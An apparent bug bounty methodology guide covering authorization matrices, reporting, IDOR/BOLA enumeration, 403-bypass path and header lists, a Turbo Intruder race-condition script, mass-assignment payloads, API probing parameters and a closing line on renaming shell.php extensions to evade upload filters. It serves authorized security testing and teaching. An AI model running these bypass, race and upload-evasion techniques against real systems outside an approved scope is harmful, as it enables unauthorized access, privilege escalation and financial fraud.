  • Roles, tenants and account states.
  • Login, registration, reset, MFA and logout transitions.
  • Server-side integrations, webhooks, imports and exports.
  • Client-side routes and API calls found in JavaScript.

The application map gives you a baseline. Without it, a different response is easy to mistake for a vulnerability when it may only be a normal state transition or an invalid request.

docs.title: 4. Build an identity and authorization matrix
docs.text:
Where the program permits it, use dedicated accounts with different roles or tenants. Record which account owns each test object and what each account should be allowed to do.

A simple matrix can compare:

Test dimension Comparison Identity Anonymous versus authenticated Role Low privilege versus administrative test role Tenant Tenant A versus Tenant B Object Owner versus non-owner State Before versus after an action Method Expected HTTP method versus an alternate method

Authentication answers who the caller is. Authorization answers what that caller may do. Test both separately: a correctly authenticated user can still be allowed to read or change another user's object.

docs.title: 5. Test the highest-value boundaries
docs.text: Change one assumption at a time and compare the trusted and untrusted result. Useful test areas include:

docs.title: Authentication and account recovery
docs.text:
Review login, registration, password reset, MFA, SSO, session invalidation, remember-me behavior and account changes. Look for weak protection, inconsistent identity checks and flows that trust client-controlled state.

See Authentication and account takeover for the detailed page.

docs.title: Authorization and object ownership
docs.text:
For reads, creates, updates, deletes, exports and bulk actions, verify the server checks the current subject, object and tenant. A successful status code is only a lead; prove that unauthorized data or a state change is actually possible.

See Access control, IDOR and race conditions.

docs.title: Input handling and injection
docs.text:
Trace untrusted input into its interpreter or output context. Consider SQL/NoSQL, template, XML, command and other parser boundaries. Prove the impact with the smallest safe marker or controlled result.

See Injections.

docs.title: Browser controls and client-side behavior
docs.text:
Review output contexts, DOM sinks, cookies, CSP, CORS, CSRF and postMessage origin checks. The browser is part of the security boundary, but server-side authorization must not depend on the interface hiding an action.

See XSS, DOM and CSP and SSRF, CORS, CSRF and smuggling.

docs.title: APIs, GraphQL, WebSockets and uploads
docs.text:
Inventory API operations and object types, then compare permissions across roles and tenants. Review GraphQL fields, WebSocket messages, upload parsing, file storage, URL fetches and webhook behavior.

See APIs, GraphQL and file uploads.

docs.title: Business logic and state transitions
docs.text: Ask whether a user can skip, repeat, reorder or combine steps to reach an outcome the product should reject. Record the state before the action, the exact transition and the resulting side effect.

docs.title: 6. Capture a safe baseline and validate the difference
docs.text:
A baseline request records normal behavior before an identity, object or state is changed. Keep the request, response, timestamp and test account together.

# Save a baseline response for an object owned by the current test account.
# Use a test token and a target explicitly listed in the program scope.
curl --silent --show-error \
  --header "Authorization: Bearer <TEST_TOKEN>" \
  "https://<DOMAIN>/api/v1/items/<YOUR_OBJECT_ID>" \
  --output "evidence/<TARGET_NAME>/baseline-item.json"

# Record the status separately so the body can be redacted without losing it.
curl --silent --output /dev/null --write-out '%{http_code}\n' \
  --header "Authorization: Bearer <TEST_TOKEN>" \
  "https://<DOMAIN>/api/v1/items/<YOUR_OBJECT_ID>" \
  > "evidence/<TARGET_NAME>/baseline-status.txt"

Then repeat with a permitted comparison account and an object it does not own. Compare status, body, sensitive fields, timing, side effects, audit events and follow-up access. A different response is a lead; the security finding is the broken boundary and its impact.

docs.title: 7. Decide whether an observation is reportable
docs.text:
Observation What is still needed A parameter is reflected Show executable impact in its actual context, or explain why it is a meaningful unsafe sink. An endpoint returns 200 Show unauthorized data or an unauthorized state change. A header is accepted Show that it changes routing, authorization, cache behavior or a reset link in a harmful way. A scanner flags SQLi or SSRF Reproduce manually and prove the data access, callback or controlled side effect. A rate limit seems weak Use approved test values, define the window and show the consequence without causing lockout or load. A control blocks the test Record the prevention or detection result instead of escalating without a new hypothesis.

Stop once the impact is unambiguous. More requests do not make a clear finding stronger and may increase risk or expose unnecessary data.

docs.title: 8. Write a useful report
docs.text:
A strong bug bounty report lets the triager reproduce the issue without guessing. Include:

  1. Title: affected feature, weakness and consequence.
  2. Summary: what trust boundary is broken.
  3. Prerequisites: account role, tenant, object and any setup.
  4. Steps: numbered requests or UI actions with sensitive values redacted.
  5. Expected result: what the server should have enforced.
  6. Observed result: what actually happened.
  7. Impact: data exposure, account access, privilege change or business consequence.
  8. Evidence: minimal requests, responses, screenshots or controlled markers.
  9. Remediation: the server-side control that should be fixed.
  10. Retest notes: what changed and how the fix was verified.

Avoid inflated impact claims. Explain the highest consequence you demonstrated, separate it from possible follow-on impact, and keep the proof within the program's rules.

docs.title: 9. Retest, clean up and close
docs.text:
After a fix, repeat the original steps from a clean session and confirm the root cause is addressed. Check both the original path and nearby methods, roles or tenants for regressions.

Remove test objects, files, accounts, tokens, webhooks and markers that the program expects you to clean up. Record what was removed, what could not be removed and who was notified. Close the evidence set with the final status and date.

docs.title: Pages in this section
docs.text:
• Authentication and account takeover — Login, reset, MFA, OAuth/OIDC, sessions and JWT trust decisions.
  • Access control, IDOR and race conditions — Object ownership, tenant isolation, forced browsing, method confusion, concurrency and business logic.
  • Injections — SQL/NoSQL, template, XML and command interpreters, with context and impact validation.
  • XSS, DOM and CSP — Output contexts, stored/blind XSS, DOM sinks, postMessage, prototype pollution and policy review.
  • SSRF, CORS, CSRF and smuggling — Server-side network access, browser cross-origin controls and proxy parsing differences.
  • APIs, GraphQL and file uploads — Inventory, BOLA/BOPLA, GraphQL, WebSockets, upload processing and object storage.

The bug bounty checklist is the coverage tracker; these pages are the reasoning and reproduction notes behind each item.

docs.title: IDOR / BOLA, 403 Bypass & Race Conditions
docs.text:
What this page is doing

Authorization testing needs a pair: a caller and an object the caller should not control. Compare roles, tenants, methods and state transitions, then use concurrency only when a normal sequential test cannot answer the question.

docs.title: 1. IDOR / BOLA Hunting Methodology
docs.text:
IDOR = every identifier your session can reference, but should not control. Map every object reference and test it with two accounts.

Enumeration Checklist Parameter Pollution & Format Confusion 
- Numeric IDs : /api/v1/invoice/1001 -> 1002, 1000, 999
- UUID v1 (timestamp) : uuid v1 leaks MAC + time -> predict/bruteforce nearby UUIDs
- UUID v4 : not guessable -> but check for UUID LEAKS (shared links, emails,
                           exports, invite links, PDF metadata, CSV exports)
- Base64 "IDs" : eyJpZCI6MTMzN30= -> decode -> {"id":1337} -> tamper -> re-encode
- Hashed IDs : MD5(user_id) -> crack, or look for bcrypt/CRC32 weak patterns
- GraphQL node(id:) : base64("User:1337") -> decode + modify
- Slug / username : /profile/john -> /profile/admin
- Nested object IDs : {"org_id":1,"user_id":999} -> change only the SECOND one
- Bulk endpoints : POST /api/users/bulk ["1","2","3"] -> add victim's ID
- Exports / reports : /export?user_id=<VICTIM> (often missing the same check)
- Multi-tenant headers : X-Org-Id: 1, X-Tenant: acme, X-Company-ID
- HTTP methods : PATCH/PUT/DELETE may bypass the GET-only authz check
- Response diffing : Compare 200 vs 403 vs 404 bodies for user objects.

First keep the request format valid, then change one representation at a time. The examples below are test cases, not a reason to send every variant to a production endpoint.

GET /api/v1/users/<VICTIM_ID>/profile HTTP/1.1
Host: <DOMAIN>
Authorization: Bearer <TEST_TOKEN>
X-Org-Id: <YOUR_ORG_ID>

# Duplicate query parameters: compare each order separately.
?user_id=<YOUR_ID>&user_id=<VICTIM_ID>
?user_id=<VICTIM_ID>&user_id=<YOUR_ID>

# Array/object coercion: send one format per request.
?user_id[]=<VICTIM_ID>
{"user_id": ["<YOUR_ID>", "<VICTIM_ID>"]}
{"user_id": {"id": "<VICTIM_ID>"}}

# Wildcard and empty values: useful only when the endpoint supports filtering.
user_id=*       | user_id=all       | user_id=       | user_id=null       | user_id=0

The secure result is consistent authorization for the object, regardless of representation. Record status, body fields, timing and side effects rather than treating a parser error as a bypass.

docs.title: 2. 403 / 401 Authorization Bypass Techniques
docs.text:
When you hit 403 Forbidden on /admin or an internal API, don't give up — try these systematically (inspired by HowToHunt's 403 Bypass):

# Path representations to compare one at a time.
/admin/        /admin//       /./admin       /admin%20
/admin%09      /admin%00      /admin..        /%2fadmin
/admin%2f      /admin;        /Admin          /ADMIN
/admin.json    /admin.html    /admin.php      /..;/admin
/api/v1/Users  /api/v1/users/. /api/v1/users%20

# Headers to test only when the front-end/back-end trust boundary is in scope.
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Referer: https://<DOMAIN>/admin

# Compare allowed HTTP methods without combining several methods into one
# invalid curl invocation. Save only status and size for the first pass.
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl --silent --output /dev/null \
    --write-out "$method %{http_code} %{size_download}\\n" \
    --request "$method" \
    "https://<DOMAIN>/admin"
done

# Compare content types only with a request body that the endpoint expects.
for content_type in \\
  'application/x-www-form-urlencoded' \\
  'application/json' \\
  'text/plain'; do
  curl --silent --output /dev/null \\
    --write-out "$content_type %{http_code}\\n" \\
    --request POST \\
    --header "Content-Type: $content_type" \\
    --data '<APPROVED_TEST_BODY>' \\
    "https://<DOMAIN>/admin"
done

# Automate the whole 403-bypass suite with a script (Kathan-style bypass list)
for p in "/.%2f" "/%2e/" "//" "/./" "/;/" "/%09" "/%00" "/..;/" "/%2e%2e/" ; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://<DOMAIN>${p}admin")
  echo "[$code] https://<DOMAIN>${p}admin"
done

docs.title: 3. Race Conditions (Limit Overrun & TOCTOU)
docs.text:
HTTP/2 Single-Packet Attack High-Value Race Targets 
# Turbo Intruder: send 30 parallel requests in ONE TCP packet (kills network jitter)
# Use this for: coupon reuse, gift-card redemption, withdrawal limits, voting,
# username registration, 2FA attempt counters, referral bonuses, invitation limits.

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://<DOMAIN>',
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           requestsPerConnection=100)
    # 1. Warm-up request (triggers connection + session setup)
    engine.queue(target.req, gate='warmup')
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race')
    engine.openGate('warmup')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)

- Redeem coupon / promo code N times (limit bypass)
- Withdraw balance / transfer funds exceeding available amount (negative balance)
- Add the same item multiple times to a cart with a single-use discount
- Register username before the uniqueness check completes (account squatting)
- Bypass "one free trial per user" by firing parallel subscription requests
- Exceed API quota / OTP attempt counters
- Multiple "invite member" calls exceeding the seat limit
- File upload + processing race (upload a file, then race the antivirus scan)
- Two-step verification race: verify AND change email simultaneously

docs.title: 4. Business Logic & Mass Assignment
docs.text:
Test one field or state transition at a time with a dedicated test account. The goal is to see whether the server ignores, rejects or applies a field the caller is not allowed to control.

POST /api/v1/register HTTP/1.1
Host: <DOMAIN>
Authorization: Bearer <TEST_TOKEN>
Content-Type: application/json

{
  "email": "<TEST_EMAIL>",
  "password": "<TEST_PASSWORD>",
  "role": "admin",
  "is_admin": true,
  "verified": true
}

{
  "role": "superadmin",
  "permissions": ["<APPROVED_TEST_PERMISSION>"],
  "plan": "enterprise",
  "tenant_id": "<TEST_TENANT_ID>"
}

Keep a property wordlist for review, but do not submit every field blindly:

role | roles | admin | is_admin | isAdmin | user_type | account_type
plan | tier | verified | email_verified | active | status | credits
balance | org_id | tenant_id | permissions | scopes | groups | mfa_enabled
password_reset_required

Other state questions to model and test with harmless values:

- Does a negative, zero or very large quantity change the price or balance?
- Can a multi-step checkout, refund or approval step be skipped or replayed?
- Can a coupon, trial, referral or seat limit be used more than once?
- Does currency conversion or decimal rounding change the expected result?
- Does changing a role or plan leave old privileges behind after downgrade?

A secure server rejects fields the caller does not control and enforces the state transition server-side. Document the before/after values and stop before creating real financial, account or data impact.

docs.title: APIs, GraphQL, WebSockets & File Uploads
docs.text:
What this page is doing

API testing is inventory plus authorization: learn the schema and versions, then ask whether each object, field, mutation, upload and message is protected for the caller and tenant. Prefer a canary record over broad data extraction.

docs.title: 1. REST API Testing Methodology
docs.text:
Discovery & Documentation Mining OWASP API Top 10 Quick Tests 
# Documentation and schema paths to check manually, one request at a time.
/swagger-ui.html       /swagger/v1/swagger.json  /v2/api-docs
/v3/api-docs           /api-docs                 /openapi.json
/redoc                 /graphql                  /graphiql
/playground            /api/v1/                  /api/v2/
/rest/                 /internal/                /.well-known/openid-configuration

# If v2 exists, compare the same object and authorization in v1, v3,
# beta, internal, legacy, mobile and staging versions where in scope.

# Pull API paths from an approved mobile lab artifact.
apktool d app.apk -o app_decoded
grep -RInE 'https?://[a-z0-9._/-]+' app_decoded \
  | sort -u

# Extract routes from JavaScript bundles collected during recon.
xnLinkFinder -i js_urls.txt -sf <DOMAIN> -o api_endpoints.txt

API1 Broken Object Level Authorization (BOLA) -> see IDOR page
API2 Broken Authentication -> weak JWT, no token expiry, API keys in URLs
API3 Broken Object Property Level Auth (BOPLA)-> mass assignment, hidden fields
API4 Unrestricted Resource Consumption -> no pagination limit (?limit=999999)
API5 Broken Function Level Authorization -> call admin-only endpoints as normal user
API6 Unrestricted Access to Sensitive Flows -> no rate limit on signup/OTP/reset
API7 SSRF -> see SSRF page
API8 Security Misconfiguration -> CORS *, debug endpoints, verbose errors
API9 Improper Inventory Management -> old/shadow API versions still live
API10 Unsafe Consumption of 3rd-Party APIs -> webhook/integration trust issues
# Always try:
?limit=999999 ?page=0 ?offset=-1 ?sort=password ?fields=* ?include=all
?filter[password][$ne]= ?expand=all ?debug=1 ?admin=1
# Try HTTP methods: OPTIONS may reveal allowed methods; HEAD may bypass body validation
# Remove auth header entirely; use an expired token; use a token from ANOTHER tenant

shell.php -> shell.php5 / .php7 / .phtml / .phar / .pgif
